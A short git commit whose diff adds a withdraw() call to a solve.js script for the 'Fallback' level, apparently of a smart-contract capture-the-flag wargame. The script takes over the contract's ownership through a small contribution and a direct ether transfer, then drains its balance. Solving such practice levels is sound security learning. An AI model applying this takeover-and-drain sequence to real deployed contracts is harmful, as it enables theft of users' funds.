ee9cedcf0bbe5119efebd5885c8b07070a03f27c
yuliyu123 <looperx95@gmail.com>
2022-04-07 19:15:48 +0800

    1

--- contracts/1_ Fallback/solve.js
+++ contracts/1_ Fallback/solve.js
@@ -1,3 +1,4 @@
 await contract.contribute({from: player, value: web3.utils.toWei('0.0001', 'ether')})
 await web3.eth.sendTransaction({from: player, to: contract.address, value: web3.utils.toWei('0.001', 'ether')})
-await contract.owner()
+await contract.owner();
+await contract.withdraw();
